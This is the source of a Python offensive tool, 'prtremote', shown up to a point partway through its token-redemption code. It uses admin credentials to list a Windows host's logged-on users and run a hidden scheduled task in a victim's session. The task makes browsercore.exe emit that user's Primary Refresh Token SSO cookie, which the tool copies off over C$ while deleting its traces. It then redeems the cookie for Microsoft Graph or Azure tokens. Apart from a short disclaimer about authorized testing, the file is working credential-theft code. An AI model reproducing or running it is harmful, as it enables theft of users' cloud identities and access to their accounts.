#!/usr/bin/env python3
"""
prtremote -- remote PRT SSO cookie tooling for Entra/hybrid-joined Windows hosts.

  check   Entra registration (CloudDomainJoin) and live interactive sessions
          (loaded HKEY_USERS hives, named via ProfileList) over MS-RRP: whether
          there is a PRT here, and whose.

  dump    Harvest a user's PRT SSO cookie. The BrowserCore native-messaging
          request is built locally, uploaded over C$, and fed to browsercore.exe
          by an InteractiveToken scheduled task in that user's live session:

              cmd /c "browsercore.exe < formatted_nonce.txt > prt_cookie.txt"

          The response comes back over C$ and is parsed here, so nothing but
          cmd.exe and a signed Microsoft binary runs on the target.

  auth    Redeem that cookie for access/refresh tokens against Graph or the Azure
          management API -- the flow 'roadtx gettokens --prt-cookie' runs, with no
          browser and no target involved.

check and dump need local admin. For authorized security assessment of systems
you own or are permitted to test.

    python3 prtremote.py check ENDPOINT/labadmin:"$PASSWORD"@win11
    python3 prtremote.py dump  ENDPOINT/labadmin:"$PASSWORD"@win11 -run-user achen
    python3 prtremote.py auth  --prt prt_cookie_win11_achen.txt --graph
"""

import argparse
import base64
import datetime
import html
import io
import json
import logging
import os
import re
import shlex
import struct
import sys
import time
import uuid
import warnings
from urllib.parse import parse_qs, urlparse

from xml.sax.saxutils import escape

# urllib3 v2 emits NotOpenSSLWarning the moment it is imported on an interpreter
# linked against LibreSSL -- the stock macOS python3, among others. requests is
# imported lazily further down, so filtering here runs first and the warning never
# reaches the console. Nothing about certificate validation is changed: every
# request in this tool goes to Entra over a normally verified TLS connection.
warnings.filterwarnings('ignore', module='urllib3')
warnings.filterwarnings('ignore', message=r'.*OpenSSL.*')

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5 import transport, rrp, scmr, tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_LEVEL_PKT_PRIVACY


# =========================================================================== #
# output -- every line is "[*] ok/info" or "[X] absent/failed", no colors
# =========================================================================== #

OK, BAD = '[*]', '[X]'
_LABEL_WIDTH = 22


class MarkerFormatter(logging.Formatter):
    """Force impacket's log bullets ([*]/[+]/[!]/[-]) into just [*] and [X]."""

    def format(self, record):
        record.marker = BAD if record.levelno >= logging.WARNING else OK
        return super().format(record)


def init_logging(debug=False):
    logger.init()
    for handler in logging.getLogger().handlers:
        handler.setFormatter(MarkerFormatter('%(marker)s %(message)s'))
    logging.getLogger().setLevel(logging.DEBUG if debug else logging.INFO)


def say(text, ok=True):
    """One marked output line (stdout, not the log stream)."""
    print('%s %s' % (OK if ok else BAD, text))


def kv(label, value, ok=True, indent=0):
    """One marked, dot-aligned 'label ... value' line."""
    pad = '  ' * indent
    say('%s %s' % ((pad + label + ' ').ljust(_LABEL_WIDTH, '.'), value), ok)


# =========================================================================== #
# MS-TSCH: run a command in a user's interactive session
# =========================================================================== #

# The InteractiveToken principal is what puts the process in the target user's
# session -- and what limits it to running only while they are logged on. Hidden
# + IgnoreNew + no execution time limit; StartBoundary is in the past because we
# always run the task on demand.
TASK_XML_TEMPLATE = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{run_user}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{command}</Command>
      <Arguments>{arguments}</Arguments>
    </Exec>
  </Actions>
</Task>
"""


def build_task_xml(run_user, command, arguments):
    """Render TASK_XML_TEMPLATE, XML-escaping the interpolated fields so a name or
    argument containing & < > cannot break the document."""
    return TASK_XML_TEMPLATE.format(run_user=escape(run_user),
                                    command=escape(command),
                                    arguments=escape(arguments))


class TSCHInteractive:
    """Registers and runs a scheduled task in a target user's interactive session.

    Output is not captured -- the task runs as the interactive user, so the caller
    redirects it to a path it can read back.
    """

    def __init__(self, username='', password='', domain='', hashes=None,
                 aesKey=None, doKerberos=False, kdcHost=None, port=445,
                 remoteName='', remoteHost=''):
        self.username = username
        self.password = password
        self.domain = domain
        self.aesKey = aesKey
        self.doKerberos = doKerberos
        self.kdcHost = kdcHost
        self.port = port
        self.remoteName = remoteName
        self.remoteHost = remoteHost
        self.lmhash, self.nthash = '', ''
        if hashes is not None:
            self.lmhash, self.nthash = hashes.split(':')

    def _connect(self):
        """Bind to ITaskSchedulerService over \\pipe\\atsvc. Returns the DCE handle."""
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % self.remoteName
        logging.debug('StringBinding %s', stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.port)
        rpctransport.setRemoteHost(self.remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.username, self.password, self.domain,
                                         self.lmhash, self.nthash, self.aesKey)
        rpctransport.set_kerberos(self.doKerberos, self.kdcHost)

        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        # ITaskSchedulerService rejects SchRpc* calls made below its required RPC
        # auth level -- recent Windows builds answer with an rpc_s_access_denied
        # fault (NOT a task-folder ACL denial) unless the binding negotiates
        # packet privacy. Force it here.
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.doKerberos:
            dce.set_auth_type(transport.RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        return dce

    def _report_last_run(self, dce, task_name, run_user):
        """Log the task's last-run result and return it (None if unreadable).

        Informational only: the payload has already fired by this point, and the
        response shape varies across impacket versions, so this never raises.
        """
        try:
            result = tsch.hSchRpcGetLastRunInfo(dce, task_name)['pLastRunResult']
        except Exception as e:
            logging.debug('Could not read last-run info (non-fatal): %s', e)
            return None

        if result == 0x0:
            logging.info('Task ran (last result 0x0)')
        elif result == 0x41301:
            logging.info('Task is still running (0x41301)')
        elif result == 0x41303:
            logging.warning('Task has never run (0x41303) -- %s is most likely not '
                            'logged on interactively', run_user)
        else:
            logging.warning('Task last result 0x%x', result)
        return result

    def play(self, task_name, task_xml, run_user, delete_after=True):
        """Register task_name, run it on demand, report the result, and (by default)
        unregister it again. Returns the last-run result, or None if unreadable."""
        dce = self._connect()
        try:
            logging.info('Registering task %s (runs as %s / InteractiveToken)',
                         task_name, run_user)
            # logonType arg = TASK_LOGON_NONE (0): the XML's <LogonType> wins.
            tsch.hSchRpcRegisterTask(dce, task_name, task_xml, tsch.TASK_CREATE,
                                     NULL, tsch.TASK_LOGON_NONE)
            try:
                logging.info('Running task on demand (only fires while %s is logged '
                             'on interactively)', run_user)
                tsch.hSchRpcRun(dce, task_name)
                time.sleep(2)   # let it produce a last-run result
                return self._report_last_run(dce, task_name, run_user)
            finally:
                if delete_after:
                    logging.info('Deleting task %s', task_name)
                    tsch.hSchRpcDelete(dce, task_name)
        finally:
            dce.disconnect()


# =========================================================================== #
# check mode -- Entra registration + live sessions over MS-RRP
# =========================================================================== #

JOININFO_KEY = r"SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo"
TENANTINFO_KEY = r"SYSTEM\CurrentControlSet\Control\CloudDomainJoin\TenantInfo"
PROFILELIST_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"


class JoinStateProbe:
    def __init__(self, smb):
        self.smb = smb

    # ------------------------------------------------------------------ #
    # Remote Registry service management (best-effort start/restore)
    # ------------------------------------------------------------------ #
    def _open_scm(self):
        # Match Impacket's own reg.py transport setup.  In particular, include
        # ``\pipe`` in the binding instead of relying on SMBTransport's filename
        # normalization, which differs between Impacket releases.
        binding = r"ncacn_np:%s[\pipe\svcctl]" % self.smb.getRemoteHost()
        rpc = transport.DCERPCTransportFactory(binding)
        rpc.set_smb_connection(self.smb)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)
        return dce

    def ensure_remote_registry(self):
        """Start the RemoteRegistry service if stopped. Returns a callable that
        stops it again afterwards, or None if it was already running / nothing to
        restore. If the service was disabled, its original startup type is restored
        as well. Every step is best-effort and non-fatal: if we can't manage the
        service, we simply proceed and let the \\winreg open surface a clear error."""
        original_start_type = None
        changed_start_type = False
        started_by_us = False

        def wait_for_state(dce, svc, wanted, timeout=10):
            deadline = time.time() + timeout
            while time.time() < deadline:
                state = scmr.hRQueryServiceStatus(dce, svc)["lpServiceStatus"]["dwCurrentState"]
                if state == wanted:
                    return True
                time.sleep(0.25)
            return False

        try:
            dce = self._open_scm()
        except Exception as e:
            logging.warning("Could not open SCM to manage RemoteRegistry: %s", e)
            return None

        try:
            scm = scmr.hROpenSCManagerW(dce)["lpScHandle"]
            svc = scmr.hROpenServiceW(dce, scm, "RemoteRegistry\x00")["lpServiceHandle"]

            # Already running? Leave it alone (don't stop a service we didn't start).
            try:
                state = scmr.hRQueryServiceStatus(dce, svc)["lpServiceStatus"]["dwCurrentState"]
            except Exception as e:
                logging.warning("Could not query RemoteRegistry status: %s", e)
                return None
            if state == scmr.SERVICE_RUNNING:
                logging.debug("RemoteRegistry already running")
                return None
            if state != scmr.SERVICE_STOPPED:
                logging.debug("RemoteRegistry is in state %s; leaving it unchanged", state)
                return None

            # Record the startup type before changing it so a disabled service can
            # be put back exactly as it was after the registry reads finish.
            try:
                config = scmr.hRQueryServiceConfigW(dce, svc)["lpServiceConfig"]
                original_start_type = config["dwStartType"]
            except Exception as e:
                logging.warning("Could not query RemoteRegistry configuration: %s", e)
                return None

            if original_start_type == scmr.SERVICE_DISABLED:
                try:
                    scmr.hRChangeServiceConfigW(
                        dce, svc, dwStartType=scmr.SERVICE_DEMAND_START
                    )
                    changed_start_type = True
                except Exception as e:
                    logging.warning("Could not enable RemoteRegistry temporarily: %s", e)
                    return None

            try:
                scmr.hRStartServiceW(dce, svc)
                started_by_us = True
            except Exception as e:
                logging.warning("Could not start RemoteRegistry: %s", e)
                if changed_start_type:
                    scmr.hRChangeServiceConfigW(
                        dce, svc, dwStartType=original_start_type
                    )
                return None

            reached_running = wait_for_state(dce, svc, scmr.SERVICE_RUNNING)
            if not reached_running:
                logging.warning("RemoteRegistry did not reach the running state")
            else:
                logging.info("Started RemoteRegistry (will restore its prior state afterwards)")

            def restore():
                d = None
                try:
                    d = self._open_scm()
                    s = scmr.hROpenSCManagerW(d)["lpScHandle"]
                    h = scmr.hROpenServiceW(d, s, "RemoteRegistry\x00")["lpServiceHandle"]
                    if started_by_us:
                        try:
                            scmr.hRControlService(d, h, scmr.SERVICE_CONTROL_STOP)
                            if not wait_for_state(d, h, scmr.SERVICE_STOPPED):
                                logging.warning("RemoteRegistry did not stop within 10 seconds")
                        except Exception as e:
                            logging.warning("Could not stop RemoteRegistry: %s", e)
                    if changed_start_type:
                        try:
                            scmr.hRChangeServiceConfigW(
                                d, h, dwStartType=original_start_type
                            )
                        except Exception as e:
                            logging.warning(
                                "Could not restore RemoteRegistry startup type: %s", e
                            )
                    logging.debug("Restored RemoteRegistry service state")
                except Exception as e:
                    logging.warning("Failed to restore RemoteRegistry service state: %s", e)
                finally:
                    try:
                        d.disconnect()
                    except Exception:
                        pass

            return restore
        except Exception as e:
            logging.warning("Could not ensure RemoteRegistry is running: %s", e)
            return None
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass

    def _open_winreg(self):
        """Open the \\winreg RPC pipe (MS-RRP), returning a bound DCE handle.
        Raises RuntimeError with actionable guidance if the pipe is absent, which
        means the RemoteRegistry service is not running on the target."""
        rpc = transport.SMBTransport(
            self.smb.getRemoteHost(), filename=r"\winreg", smb_connection=self.smb
        )
        dce = rpc.get_dce_rpc()
        try:
            dce.connect()
        except SessionError as e:
            if e.getErrorCode() == 0xC0000034:  # STATUS_OBJECT_NAME_NOT_FOUND
                raise RuntimeError(
                    "The \\winreg pipe was not found -- the RemoteRegistry service "
                    "is not running on the target. On the target, run (elevated): "
                    "Set-Service RemoteRegistry -StartupType Automatic; "
                    "Start-Service RemoteRegistry"
                )
            raise
        dce.bind(rrp.MSRPC_UUID_RRP)
        return dce

    # ------------------------------------------------------------------ #
    # Signal 1: Entra device registration via MS-RRP
    # ------------------------------------------------------------------ #
    def _enum_from_handle(self, dce, hkey):
        """Enumerate subkey names under an already-open key handle."""
        names = []
        i = 0
        while True:
            try:
                enum = rrp.hBaseRegEnumKey(dce, hkey, i)
            except DCERPCException:
                break
            names.append(enum["lpNameOut"].rstrip("\x00"))
            i += 1
        return names

    def _enum_subkeys(self, dce, root, path):
        """Return list of subkey names under <root>\\<path>, or [] if key absent."""
        try:
            ans = rrp.hBaseRegOpenKey(dce, root, path)
        except DCERPCException:
            return []  # key does not exist
        hkey = ans["phkResult"]
        names = self._enum_from_handle(dce, hkey)
        rrp.hBaseRegCloseKey(dce, hkey)
        return names

    def _read_value(self, dce, root, path, value_name):
        """Read a single registry value, or None if absent. Returns a str."""
        try:
            ans = rrp.hBaseRegOpenKey(dce, root, path)
        except DCERPCException:
            return None
        hkey = ans["phkResult"]
        try:
            res = rrp.hBaseRegQueryValue(dce, hkey, value_name)
            data = res[1] if isinstance(res, (tuple, list)) else res
            if isinstance(data, bytes):
                data = data.decode("utf-16-le", errors="replace")
            return str(data).rstrip("\x00")
        except DCERPCException:
            return None
        finally:
            rrp.hBaseRegCloseKey(dce, hkey)

    def query_entra(self):
        """Returns (azure_ad_joined: bool, thumbprints: list, tenant_ids: list)."""
        dce = self._open_winreg()
        try:
            hklm = rrp.hOpenLocalMachine(dce)["phKey"]
            thumbprints = self._enum_subkeys(dce, hklm, JOININFO_KEY)
            tenant_ids = self._enum_subkeys(dce, hklm, TENANTINFO_KEY)
            return (len(thumbprints) > 0, thumbprints, tenant_ids)
        finally:
            dce.disconnect()

    # ------------------------------------------------------------------ #
    # Signal 2: live user sessions via loaded hives (MS-RRP)
    # ------------------------------------------------------------------ #
    def query_live_sessions(self):
        """Return users with a live interactive session on the target.

        A user hive currently loaded under HKEY_USERS means that user has an
        active profile / interactive session right now => a live-PRT candidate.
        This does NOT read LSASS, so it does not PROVE a valid PRT -- the PRT
        itself only lives in LSASS memory -- but a loaded hive on an
        Entra-registered box is the signal that a harvest can succeed.

        Returns loaded: list[(sid, name|None)].
        """
        dce = self._open_winreg()
        try:
            hklm = rrp.hOpenLocalMachine(dce)["phKey"]

            # SID -> account name, from ProfileList (best-effort resolution).
            names = {}
            for sid in self._enum_subkeys(dce, hklm, PROFILELIST_KEY):
                path = self._read_value(
                    dce, hklm, PROFILELIST_KEY + "\\" + sid, "ProfileImagePath"
                )
                if path:
                    names[sid] = path.split("\\")[-1]

            def looks_like_user_sid(s):
                # On-prem/local users: S-1-5-21-...; Entra cloud SIDs: S-1-12-1-...
                return s.startswith("S-1-5-21-") or s.startswith("S-1-12-1-")

            # Currently-loaded user hives => logged-on interactive users.
            hku = rrp.hOpenUsers(dce)["phKey"]
            loaded = [
                (s, names.get(s))
                for s in self._enum_from_handle(dce, hku)
                if looks_like_user_sid(s) and not s.endswith("_Classes")
            ]
            return loaded
        finally:
            dce.disconnect()


def run_check(options, domain, username, password, remoteName):
    """check mode: connect over SMB and report the two recon signals."""
    lmhash = nthash = ''
    if options.hashes:
        lmhash, nthash = options.hashes.split(':')

    logging.info('Connecting to %s (%s)', remoteName, options.target_ip)
    smb = SMBConnection(remoteName, options.target_ip, sess_port=int(options.port))
    if options.k:
        smb.kerberosLogin(username, password, domain, lmhash, nthash,
                          options.aesKey, kdcHost=options.dc_ip)
    else:
        smb.login(username, password, domain, lmhash, nthash)

    probe = JoinStateProbe(smb)
    restore = probe.ensure_remote_registry()
    try:
        try:
            azure_ad, thumbs, tenants = probe.query_entra()
            loaded = probe.query_live_sessions()
        except RuntimeError as e:
            logging.error(str(e))
            return 2
    finally:
        if restore:
            restore()
        smb.close()

    print('')
    kv('Target', remoteName)
    kv('Entra registered', 'YES' if azure_ad else 'NO', ok=azure_ad)
    if azure_ad:
        kv('Device key(s)', ', '.join(thumbs) or '<none>', indent=1)
        kv('Tenant ID(s)', ', '.join(tenants) or '<none>', indent=1)
    kv('Live sessions', len(loaded), ok=bool(loaded))
    for sid, name in loaded:
        kv(name or '<unresolved>', sid, indent=1)

    if azure_ad and loaded:
        candidates = [name or sid for sid, name in loaded]
        # Never reuse options.target here: it is the raw CLI argument and may
        # contain a plaintext password.  Emit a literal shell-variable reference
        # instead, so copying the command uses $PASSWORD without disclosing it.
        # If the variable is unset, the existing getpass() fallback still applies.
        account = ('%s/' % domain if domain else '') + username
        safe_target = ('%s:"$PASSWORD"@%s'
                       % (shlex.quote(account), shlex.quote(remoteName))
                       if account else shlex.quote(remoteName))
        print('')
        say('Harvest with: prtremote.py dump %s -run-user %s'
            % (safe_target, shlex.quote(candidates[0])))
        if len(candidates) > 1:
            say('Other candidates: %s' % ', '.join(candidates[1:]))
    elif not azure_ad:
        print('')
        say('Not Entra-registered -- no PRT to harvest on this host.', ok=False)
    else:
        print('')
        say('No live interactive session -- an InteractiveToken task cannot run.',
            ok=False)

    return 0


# =========================================================================== #
# dump mode -- BrowserCore PRT-cookie harvest via InteractiveToken task
# =========================================================================== #

# BrowserCore is a Chrome native-messaging host: one length-prefixed JSON request
# on stdin, one length-prefixed JSON response on stdout. Since the server nonce is
# anonymous, the request can be built here and simply redirected in from a file --
# no PowerShell, no code of ours on the target, and parsing happens where failures
# are debuggable.

# The request RetrievePRTCookieWithNonce.ps1 sends, in the browser's key order.
NATIVE_REQUEST = ('{{"method":"GetCookies",'
                  '"uri":"https://login.microsoftonline.com/common/oauth2/'
                  'authorize?sso_nonce={nonce}",'
                  '"sender":"https://login.microsoftonline.com"}}')

# Protocol cap for a native-messaging body; a cookie response is ~2 KB.
MAX_NATIVE_RESPONSE = 1024 * 1024


def build_native_request(nonce):
    """4-byte little-endian length + UTF-8 JSON: what browsercore.exe expects."""
    body = NATIVE_REQUEST.format(nonce=nonce).encode('utf-8')
    return struct.pack('<I', len(body)) + body


def parse_native_response(data):
    """Decode a raw browsercore.exe stdout capture into (state, payload):
    'wait' (incomplete), 'ok' (payload is the cookie) or 'error' (payload is why).
    """
    if len(data) < 4:
        return 'wait', None
    length = struct.unpack('<I', data[:4])[0]
    if length == 0 or length > MAX_NATIVE_RESPONSE:
        return 'error', ('implausible response length %d -- stdout is not a '
                         'native-messaging stream' % length)
    if len(data) < 4 + length:
        return 'wait', None

    try:
        msg = json.loads(data[4:4 + length].decode('utf-8'))
    except ValueError as e:
        return 'error', 'response body is not valid JSON (%s)' % e

    for item in msg.get('response') or []:
        if item.get('name') == 'x-ms-RefreshTokenCredential' and item.get('data'):
            return 'ok', item['data']

    # BrowserCore reports its own failures in the same envelope, so pass it on.
    return 'error', ('no x-ms-RefreshTokenCredential in response: %s'
                     % json.dumps(msg)[:300])


def build_redirect_arguments(request_path, response_path):
    """cmd.exe arguments redirecting request_path into browsercore.exe.

    /d skips any AutoRun command, whose output would otherwise land in the
    redirected stdout and corrupt the response. /s makes cmd strip exactly the
    outer quotes and run the rest verbatim, keeping the embedded quoting
    predictable. %windir% is left for cmd to expand, so a non-C: system drive
    still works.
    """
    return (r'/d /s /c ""%%windir%%\BrowserCore\browsercore.exe" < "%s" > "%s""'
            % (request_path, response_path))


def build_task_action(request_path, response_path):
    """(command, arguments) for the task's <Exec>.

    cmd.exe does the redirection: browsercore.exe reads the request from stdin and
    writes the response to stdout, and the token -- and therefore the session and
    its PRT -- is inherited straight down the chain.
    """
    return 'cmd.exe', build_redirect_arguments(request_path, response_path)


def win_to_share_path(win_path):
    """C:\\Users\\Public\\x.txt -> ('C$', 'Users\\Public\\x.txt')."""
    drive, _, rest = win_path.partition(':')
    return '%s$' % drive, rest.lstrip('\\')


# Fixed task path. Registered, run on demand, and deleted again in the same call.
TASK_NAME = r'\PRTRemoteTask'

# Fixed on-target staging. The run-user's Desktop: they can read the request and
# create the response there, and an admin can write it over C$.
REQUEST_FILENAME = 'formatted_nonce.txt'
RESPONSE_FILENAME = 'prt_cookie.txt'


def fetch_srv_nonce():
    """Fetch a server nonce (grant_type=srv_challenge) from Entra.

    It is tenant-global and anonymous -- not bound to device, user or source IP --
    so fetching it here is as valid as fetching it on the target, and the target
    makes no outbound call to Microsoft during the harvest.
    """
    import requests
    r = requests.post("https://login.microsoftonline.com/common/oauth2/token",
                      data={"grant_type": "srv_challenge"}, timeout=30)
    r.raise_for_status()
    nonce = r.json().get("Nonce")
    if not nonce:
        raise RuntimeError("srv_challenge returned no Nonce: %s" % r.text[:200])
    return nonce


class SMBFetcher:
    """Minimal C$ reader/writer/deleter, same creds as the task registration."""

    def __init__(self, username='', password='', domain='', hashes=None,
                 aesKey=None, doKerberos=False, kdcHost=None, port=445,
                 remoteName='', remoteHost=''):
        lmhash, nthash = '', ''
        if hashes is not None:
            lmhash, nthash = hashes.split(':')
        self.conn = SMBConnection(remoteName, remoteHost, sess_port=port)
        if doKerberos:
            self.conn.kerberosLogin(username, password, domain, lmhash, nthash,
                                    aesKey, kdcHost)
        else:
            self.conn.login(username, password, domain, lmhash, nthash)

    def read(self, share, path):
        """File bytes, or None if it isn't readable yet -- missing, or still held
        open by the redirect. Both mean 'poll again'."""
        chunks = []
        try:
            self.conn.getFile(share, path, chunks.append)
        except Exception as e:
            msg = str(e).upper()
            if 'NOT_FOUND' in msg or 'NO_SUCH_FILE' in msg:
                return None
            if 'SHARING_VIOLATION' in msg or 'LOCK_CONFLICT' in msg:
                logging.debug('%s\\%s is still locked; will retry' % (share, path))
                return None
            raise
        return b''.join(chunks)

    def write(self, share, path, data):
        self.conn.putFile(share, path, io.BytesIO(data).read)

    def exists(self, share, path):
        """True if path is present on share (file or directory)."""
        try:
            self.conn.listPath(share, path.rstrip('\\'))
            return True
        except Exception as e:
            logging.debug('%s\\%s not found: %s' % (share, path, e))
            return False

    def delete(self, share, path):
        try:
            self.conn.deleteFile(share, path)
        except Exception as e:
            logging.debug('cleanup: could not delete %s\\%s: %s' % (share, path, e))

    def list_profiles(self):
        """Return real user profile-folder names under C:\\Users (over C$)."""
        skip = {'.', '..', 'public', 'default', 'default user', 'all users'}
        out = []
        for e in self.conn.listPath('C$', 'Users\\*'):
            name = e.get_longname()
            if not e.is_directory() or name.lower() in skip:
                continue
            out.append(name)
        return out

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass


def resolve_stage_dir(fetcher, run_user):
    """The run-user's Desktop, which is where the request and response are staged.

    Admin has to be able to write the request there over C$, and run_user has to be
    able to read it and create the response; their own Desktop satisfies both
    through inherited ACLs.

    The path must be known before the upload, so the profile folder is resolved from
    C$\\Users rather than left to %USERPROFILE% on the target.
    """
    sam = run_user.split('\\')[-1].split('/')[-1]
    try:
        profiles = fetcher.list_profiles()
    except Exception as e:
        logging.debug('Could not list C$\\Users: %s' % e)
        profiles = []

    # 'achen' may live in 'achen', or 'achen.ENDPOINT' after a profile rebuild.
    for p in [q for q in profiles
              if q.lower() == sam.lower() or q.lower().startswith(sam.lower() + '.')]:
        candidate = 'Users\\%s\\Desktop' % p
        if fetcher.exists('C$', candidate):
            return 'C:\\' + candidate
        logging.debug('Profile %s has no Desktop directory' % p)

    # Public is writable by any interactive user.
    logging.warning("Could not resolve %s's Desktop -- staging in C:\\Users\\Public "
                    'instead', sam)
    return 'C:\\Users\\Public'


def plan_paths(fetcher, run_user):
    """On-target request/response paths. Both are fixed names on the run-user's
    Desktop; there is no option to relocate them."""
    stage_dir = resolve_stage_dir(fetcher, run_user)
    return ('%s\\%s' % (stage_dir, REQUEST_FILENAME),
            '%s\\%s' % (stage_dir, RESPONSE_FILENAME))


def stage_request(fetcher, run_user):
    """Build and upload the request. Returns (command, arguments, request, response)."""
    request_path, response_path = plan_paths(fetcher, run_user)
    request = build_native_request(fetch_srv_nonce())
    logging.info('Nonce fetched from login.microsoftonline.com')

    fetcher.write(*win_to_share_path(request_path), data=request)
    # A response file left over from an earlier run would read back as this one's.
    fetcher.delete(*win_to_share_path(response_path))

    command, arguments = build_task_action(request_path, response_path)

    logging.info('Uploaded a %d-byte request; the task will run:', len(request))
    logging.info('  %s %s', command, arguments)
    return command, arguments, request_path, response_path


def harvest(options, conn, fetcher, remoteName):
    """Run the task as -run-user, poll C$ for the response, save the cookie.

    Returns (exit_code, local_path_or_None, cookie_length): 2 if -run-user is not
    logged on, 3 if the harvest itself failed.
    """
    run_user = options.run_user
    task_name = TASK_NAME
    command, arguments, request_path, response_path = \
        stage_request(fetcher, run_user)

    seen = False
    state, payload = 'wait', None
    started = time.time()
    try:
        executer = TSCHInteractive(**conn)
        executer.play(task_name, build_task_xml(run_user, command, arguments),
                      run_user, delete_after=True)

        # cmd creates the response file the moment the task fires, so 'it exists'
        # does not mean 'browsercore.exe is done' -- the length prefix decides.
        logging.info('Waiting for the response (up to %ds)', options.timeout)
        deadline = time.time() + options.timeout
        while True:
            data = fetcher.read(*win_to_share_path(response_path))
            if data is not None:
                seen = True
                state, payload = parse_native_response(data)
                if state == 'ok':
                    logging.info('Response complete after %.0fs (%d bytes)',
                                 time.time() - started, len(data))
            if state != 'wait' or time.time() >= deadline:
                break
            time.sleep(options.poll)
    finally:
        # The request carries the nonce, the response the cookie: clean up both,
        # including when the harvest failed.
        for path in (request_path, response_path):
            fetcher.delete(*win_to_share_path(path))
        logging.info('Removed the request and response files from the target')

    if state == 'wait':
        if not seen:
            logging.error('No response file appeared -- most likely %s is not logged '
                          'on interactively', run_user)
            return 2, None, 0
        logging.error('%s was created but never completed within %ds -- try a longer '
                      '-timeout', response_path, options.timeout)
        return 3, None, 0

    if state == 'error':
        logging.error('BrowserCore ran but returned no usable cookie: %s', payload)
        return 3, None, 0

    safe_user = run_user.replace('\\', '_').replace('/', '_')
    local_path = 'prt_cookie_%s_%s.txt' % (remoteName, safe_user)
    with open(local_path, 'w') as fh:
        fh.write(payload)

    return 0, os.path.abspath(local_path), len(payload)


def run_dump(options, domain, username, password, remoteName):
    """dump mode: harvest -run-user's PRT cookie and save it locally."""
    # Shared connection kwargs for TSCHInteractive / SMBFetcher.
    conn = dict(username=username, password=password, domain=domain,
                hashes=options.hashes, aesKey=options.aesKey, doKerberos=options.k,
                kdcHost=options.dc_ip, port=int(options.port),
                remoteName=remoteName, remoteHost=options.target_ip)

    logging.info('Connecting to %s (%s)', remoteName, options.target_ip)
    fetcher = SMBFetcher(**conn)   # one connection for the upload, reads and deletes
    try:
        code, local_path, length = harvest(options, conn, fetcher, remoteName)
    finally:
        fetcher.close()

    print('')
    if code != 0:
        say('No cookie harvested for %s.' % options.run_user, ok=False)
        return code

    kv('Target', remoteName)
    kv('Run-user', options.run_user)
    kv('Cookie file', local_path)
    kv('Cookie length', '%d chars' % length)
    print('')
    say('Redeem now -- the cookie is only valid for about 5 minutes:')
    say('  prtremote.py auth --prt %s --graph' % local_path)
    return 0


# =========================================================================== #
# auth mode -- PRT cookie -> access/refresh tokens
# =========================================================================== #

# The same flow as 'roadtx gettokens --prt-cookie' (roadlib auth.py
# authenticate_with_prt_cookie): the cookie buys an authorization code at
# /authorize, the code is redeemed at /token. No browser is involved.
AUTHORITY = 'https://login.microsoftonline.com/common'
# Azure CLI: a public client with user_impersonation on both resources below, and
# roadtx's own default. The redirect must be one it has registered.
AUTH_CLIENT = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'
AUTH_REDIRECT = 'ms-appx-web://Microsoft.AAD.BrokerPlugin/' + AUTH_CLIENT
RESOURCES = {'graph': 'https://graph.microsoft.com',
             'azure': 'https://management.azure.com'}
AUTH_UA = ('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; '
           'Trident/7.0; .NET4.0C; .NET4.0E)')


def jwt_body(token):
    """A JWT's claims, unverified -- we only ever read them."""
    seg = token.split('.')[1]
    return json.loads(base64.urlsafe_b64decode(seg + '=' * (-len(seg) % 4)))


def token_claims(access_token):
    """Claims of an access token, or {} when it is encrypted (JWE) or opaque."""
    if access_token.count('.') != 2:
        return {}
    try:
        return jwt_body(access_token)
    except Exception as e:
        logging.debug('Could not decode the access token: %s' % e)
        return {}


def describe_authorize_failure(res, location):
    """Turn a non-redirect /authorize reply into one actionable sentence."""
    if res.status_code == 302 and 'sso_nonce' in location.lower():
        return ('Entra returned a fresh nonce instead of a code, so the cookie was '
                'already stale -- harvest a new one and redeem it right away')

    # Entra commonly puts the real error in a $Config JSON object. Decode one
    # JSON value rather than depending on a particular script terminator, which
    # has changed across login-page versions.
    body = res.text
    marker = body.find('$Config=')
    if marker != -1:
        try:
            cfg, _ = json.JSONDecoder().raw_decode(body[marker + 8:].lstrip())
        except (TypeError, ValueError):
            cfg = {}
